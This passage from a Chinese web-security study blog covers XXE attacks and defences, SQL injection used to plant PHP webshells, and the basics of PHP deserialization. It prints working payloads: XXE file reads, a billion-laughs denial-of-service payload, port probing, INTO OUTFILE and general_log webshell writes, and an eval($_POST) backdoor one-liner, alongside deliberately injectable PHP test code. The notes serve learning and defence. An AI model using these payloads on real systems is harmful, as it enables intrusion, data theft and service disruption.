        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"doLogin.php"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">contentType</span><span class="token operator">:</span> <span class="token string">"application/xml;charset=utf-8"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span>
        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"xml"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">anysc</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        	<span class="token keyword">var</span> code <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>
        	<span class="token keyword">var</span> msg <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>
        	<span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        		<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        		<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        		<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"error:"</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token function-variable function">error</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">XMLHttpRequest<span class="token punctuation">,</span>textStatus<span class="token punctuation">,</span>errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>errorThrown <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> textStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>

<p>测试登录，抓包分析</p>
<img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210714155409977.png" class="" title="image-20210714155409977" loading="lazy">

<p>username为注入点，存在回显，开始注入</p>
<img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210714155521875.png" class="" title="image-20210714155521875" loading="lazy">

<p>payload</p>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;
&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre>

<h3 id="拒绝服务攻击（Dos）"><a href="#拒绝服务攻击（Dos）" class="headerlink" title="拒绝服务攻击（Dos）"></a>拒绝服务攻击（Dos）</h3><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
   &lt;!DOCTYPE lolz [
&lt;!ENTITY lol &quot;lol&quot;&gt;
&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</code></pre>

<p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p>
<h3 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h3><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;</code></pre>

<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><ol>
<li>禁用外部实体</li>
</ol>
<ul>
<li>php</li>
</ul>
<pre class="language-none"><code class="language-none">libxml_disable_entity_loader(true);</code></pre>

<ul>
<li>java</li>
</ul>
<pre class="language-none"><code class="language-none">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);</code></pre>

<ul>
<li>Python</li>
</ul>
<pre class="language-none"><code class="language-none">from lxml import etree
xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</code></pre>

<ol>
<li>过滤用户提交的XML数据</li>
</ol>
<p>过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
<ol start="2">
<li>不允许XML中含有自定义的DTD</li>
</ol>
<h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ul>
<li><p><a href="https://xz.aliyun.com/t/6887#toc-0">从XML相关一步一步到XXE漏洞</a></p>
</li>
<li><p><a href="https://www.extrader.top/posts/55c267c8/?t=1626414357971">XXE学习笔记</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入GetShell</title>
    <url>/2022/05/01/sql%E6%B3%A8%E5%85%A5%E4%B9%8BGetShell/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由 sql 注入入手 GetShell，姿势少见但好用。</p>
<p>虽然好用，但是作为旁门左道，需要同时满足多种条件。</p>
<h1 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h1><ul>
<li>前提：</li>
</ul>
<blockquote>
<ol>
<li>知道绝对路径</li>
<li>有写文件的权限</li>
<li>单引号未过滤</li>
<li>secure_file_priv 没有具体值</li>
</ol>
</blockquote>
<p>secure_file_priv：</p>
<ul>
<li>secure_file_priv 的值为 <code>null</code> ，表示限制 mysqld 不允许导入 &#x2F; 导出</li>
<li>当 secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入 &#x2F; 导出只能发生在&#x2F;tmp&#x2F;目录下</li>
<li>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 &#x2F; 导出做限制</li>
</ul>
<p>测试代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    
<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sqlshell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username = '"</span> <span class="token operator">.</span> <span class="token variable">$username</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_row</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello "</span> <span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">" !"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Login failed!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<h2 id="union-select"><a href="#union-select" class="headerlink" title="union select"></a>union select</h2><p>payload：</p>
<pre class="language-none"><code class="language-none">password&#x3D;123456&amp;username&#x3D;admin&#39; union select 1,&#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;D:&#x2F;Environment&#x2F;phpstudy_pro&#x2F;WWW&#x2F;shell.php&#39; #</code></pre>

<p>结果：</p>
<img src="/2022/05/01/sql%E6%B3%A8%E5%85%A5%E4%B9%8BGetShell/image-20220501155843949.png" class="" title="image-20220501155843949" loading="lazy">

<h2 id="line-starting"><a href="#line-starting" class="headerlink" title="line starting"></a>line starting</h2><p>设置每行开头的字符。</p>
<p>payload：</p>
<pre class="language-none"><code class="language-none">password&#x3D;123456&amp;username&#x3D;admin&#39; into outfile &#39;D:&#x2F;Environment&#x2F;phpstudy_pro&#x2F;WWW&#x2F;shell.php&#39; lines starting by &#39;&lt;?php phpinfo();?&gt;&#39;#</code></pre>

<p>结果：</p>
<img src="/2022/05/01/sql%E6%B3%A8%E5%85%A5%E4%B9%8BGetShell/image-20220501161903528.png" class="" title="image-20220501161903528" loading="lazy">

<h2 id="fields-terminated"><a href="#fields-terminated" class="headerlink" title="fields terminated"></a>fields terminated</h2><p>设置字段之间的分隔符，默认值是 <code>\t</code> 。</p>
<p>payload：</p>
<pre class="language-none"><code class="language-none">password&#x3D;123456&amp;username&#x3D;admin&#39; into outfile &#39;D:&#x2F;Environment&#x2F;phpstudy_pro&#x2F;WWW&#x2F;shell.php&#39; fields terminated by &#39;&lt;?php phpinfo();?&gt;&#39;#</code></pre>

<p>结果：</p>
<img src="/2022/05/01/sql%E6%B3%A8%E5%85%A5%E4%B9%8BGetShell/image-20220501162304246.png" class="" title="image-20220501162304246" loading="lazy">

<h2 id="COLUMNS-terminated"><a href="#COLUMNS-terminated" class="headerlink" title="COLUMNS terminated"></a>COLUMNS terminated</h2><p>payload：</p>
<pre class="language-none"><code class="language-none">password&#x3D;123456&amp;username&#x3D;admin&#39; into outfile &#39;D:&#x2F;Environment&#x2F;phpstudy_pro&#x2F;WWW&#x2F;shell.php&#39; COLUMNS terminated by &#39;&lt;?php phpinfo();?&gt;&#39;#</code></pre>

<p>结果：</p>
<img src="/2022/05/01/sql%E6%B3%A8%E5%85%A5%E4%B9%8BGetShell/image-20220501163445074.png" class="" title="image-20220501163445074" loading="lazy">

<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><ul>
<li>前提：</li>
</ul>
<blockquote>
<ol>
<li>未对 <code>;</code> 进行过滤</li>
<li>中间层查询数据库信息时可同时执行多条sql语句</li>
</ol>
</blockquote>
<p>测试代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    
<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sqlshell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	
    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username = '"</span> <span class="token operator">.</span> <span class="token variable">$username</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>
    <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">multi_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_row</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" !&lt;br>"</span><span class="token punctuation">;</span>
    
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span></code></pre>

<h2 id="insert-into"><a href="#insert-into" class="headerlink" title="insert into"></a>insert into</h2><p>把木马插入到数据库，在页面查询的时候带出执行。</p>
<p>payload：</p>
<pre class="language-none"><code class="language-none">password&#x3D;1&amp;username&#x3D;2&#39;;insert into users(username,password) values(&#39;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt;&#39;,&#39;test&#39;);#</code></pre>

<p>结果：</p>
<img src="/2022/05/01/sql%E6%B3%A8%E5%85%A5%E4%B9%8BGetShell/image-20220501172017740.png" class="" title="image-20220501172017740" loading="lazy">

<h2 id="log"><a href="#log" class="headerlink" title="log"></a>log</h2><p>利用 mysql 的日志文件写马。</p>
<p>payload：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SHOW GLOBAL VARIABLES LIKE &#39;general_log&#39;;		# 查看全局日志是否开启
SET GLOBAL general_log &#x3D; ON;					# 开启全局日志
SET GLOBAL general_log_file &#x3D; &#39;D:&#x2F;Environment&#x2F;phpstudy_pro&#x2F;WWW&#x2F;shell.php&#39;;		# 设置全局日志路径
SELECT &#39;&lt;?php phpinfo();?&gt;&#39;;					# 写马</code></pre>

<p>结果：</p>
<img src="/2022/05/01/sql%E6%B3%A8%E5%85%A5%E4%B9%8BGetShell/image-20220501172846215.png" class="" title="image-20220501172846215" loading="lazy">

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化-PHP</title>
    <url>/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>为了有效地存储或传递数据，同时不丢失其类型和结构，经常需要利用序列化和反序列化函数对数据进行处理</p>
<p>序列化函数返回字符串，此字符串包含了表示值的字节流，可以存储于任何地方</p>
<p>反序列化函数对单一的已序列化的变量进行操作，将其转换回原来的值</p>
<h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><p>PHP中的序列化函数是<code>serialize()</code></p>
<h2 id="NULL和标量类型数据的序列化"><a href="#NULL和标量类型数据的序列化" class="headerlink" title="NULL和标量类型数据的序列化"></a>NULL和标量类型数据的序列化</h2><ul>
<li>NULL</li>
</ul>
<p>在PHP中，NULL被序列化为<code>N</code></p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210731182838917.png" class="" loading="lazy">

<ul>
<li>bool型</li>
</ul>
<p>bool型数据被序列化为<code>b:&lt;digit&gt;</code>。其中，<digit>表示0或1</p>
<p>当bool型数据为false时，<digit>为0，反之为1</p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210731182945866.png" class="" loading="lazy">

<ul>
<li>int型</li>
</ul>
<p>int型数据被序列化为<code>i:&lt;number&gt;</code>。其中，<number>为一个整型数，范围为-2147483648~2147483647，数字前可以有正负号</p>
<p>如果被序列化的数字溢出则被序列化为浮点型</p>
<p>如果序列化后的数字超过这个范围，则反序列化时不会返回期望的数值</p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210731183505232.png" class="" loading="lazy">

<ul>
<li>double型</li>
</ul>
<p>double型数据被序列化为<code>d:&lt;number&gt;</code>，其中，<number>为一个浮点数，其范围与PHP的浮点数范围一样，可以表示为整数形式、浮点数形式和科学计数法形式</p>
<p>如果序列化（负）无穷大，则<number>为(-)INF</p>
<p>如果序列化后的数字小于PHP所能表示的最小精度，则反序列化时返回0</p>
<p>如果被序列化的数据非数字，则被序列化为NAN，NAN反序列化时返回0</p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210801104837528.png" class="" loading="lazy">

<ul>
<li>string型</li>
</ul>
<p>string型数据被序列化为<code>s:&lt;length&gt;:&quot;&lt;value&gt;&quot;</code></p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210801105352773.png" class="" loading="lazy">

<h2 id="简单复合型数据的序列化"><a href="#简单复合型数据的序列化" class="headerlink" title="简单复合型数据的序列化"></a>简单复合型数据的序列化</h2><ul>
<li>数组</li>
</ul>
<p>数组通常被序列化为<code>a:&lt;n&gt;:&#123;&lt;key 1&gt;;&lt;value 1&gt;;&lt;key 2&gt;;&lt;value 2&gt;;···&lt;key n&gt;;&lt;value n&gt;&#125;</code></p>
<p>其中<code>n</code>表示数组元素的个数，<code>&lt;key&gt;</code>代表元素下标，<code>&lt;value&gt;</code>代表相应的值</p>
<blockquote>
<p>数组下标的类型<strong>只能</strong>为整型和字符串型，数组序列化后的格式与整型和字符串型数据序列化后的格式相同</p>
<p>数组元素值可以是<strong>任意类型</strong>，其序列化后的格式与其所对应的类型序列化后的格式相同</p>
</blockquote>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210801110509392.png" class="" loading="lazy">

<ul>
<li>对象</li>
</ul>
<p>对象通常被序列化为<code>O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;;&lt;field value 1&gt;;&lt;field name 2&gt;;···&lt;field name n&gt;&lt;field value n&gt;&#125;</code></p>
<p>其中，<code>&lt;length&gt;</code>代表对象的类名的字符串长度；<code>&lt;class name&gt;</code>代表对象的类名；<code>&lt;n&gt;</code>表示对象中的字段个数</p>
<p>这些字段包括在对象所在类及其祖先类中用<code>var</code>、<code>public</code>、<code>protected</code>、<code>private</code>声明的字段，但是不包括用<code>static</code>和<code>const</code>声明的静态字段，也就是说只有实例字段</p>
<p><code>&lt;field name&gt;</code>表示字段名，<code>&lt;field value&gt;</code>表示字段值</p>
<blockquote>
<p>字段名是字符串型，序列化后的格式与字符串型数据序列化后的格式相同</p>
<p>字段值可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同</p>
</blockquote>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210801112347540.png" class="" title="image-20210801112347540" loading="lazy">

<p>其中，O表示object，3表示对象的类名的字符串长度为3，Foo表示对象的类名是Foo，2表示有两个数据字段</p>
<p>第一个字段是<code>s:10:&quot;aMamberVar&quot;;s:26:&quot;aMamberVar Member Variable&quot;;</code></p>
<p><code>s:10:&quot;aMamberVar&quot;;</code>表示字段的类型是string，字段长度是10，字段名称是aMamberVar</p>
<p><code>s:26:&quot;aMamberVar Member Variable&quot;;</code>表示字段的类型是string，字段长度是26，字段值是aMamberVar Member Variable</p>
<p>第二个字段是<code>s:9:&quot;aFuncName&quot;;s:11:&quot;aMemberFunc&quot;;</code></p>
<p><code>s:9:&quot;aFuncName&quot;;</code>表示字段的类型是string，字段长度是9，字段名称是aFuncName</p>
<p><code>s:11:&quot;aMemberFunc&quot;;</code>表示字段的类型是string，字段长度是11，字段值是aMemberFunc</p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>PHP中的反序列化函数是<code>unserialize()</code></p>
<p>若被序列化的变量是一个对象，在重新构造对象后，会自动调用__wakeup成员函数（如果存在）</p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210801123334504.png" class="" title="image-20210801123334504" loading="lazy">

<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>反序列化漏洞产生的主要原因是;</p>
<ol>
<li>unserialize函数的参数可控</li>
<li>存在魔法函数</li>
</ol>
<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p><code>__construct</code>、<code>__destruct</code>、<code>__call</code>、<code>__callStatic</code>、<code>__get</code>、<code>__set</code>、<code>__isset</code>、<code>__unset</code>、<code>__sleep</code>、<code>__wakeup</code>、<code>__toString</code>、<code>__invoke</code>、<code>__set_state</code>、<code>__debugInfo</code>等成员函数在PHP中被称为魔法函数</p>
<pre class="language-none"><code class="language-none">__wakeup() &#x2F;&#x2F;执行unserialize()时，先会调用这个函数
__sleep() &#x2F;&#x2F;执行serialize()时，先会调用这个函数
__destruct() &#x2F;&#x2F;对象被销毁时触发
__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发
__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发
__get() &#x2F;&#x2F;用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() &#x2F;&#x2F;用于将数据写入不可访问的属性
__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发
__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发
__toString() &#x2F;&#x2F;把类当作字符串使用时触发
__invoke() &#x2F;&#x2F;当尝试将对象调用为函数时触发</code></pre>

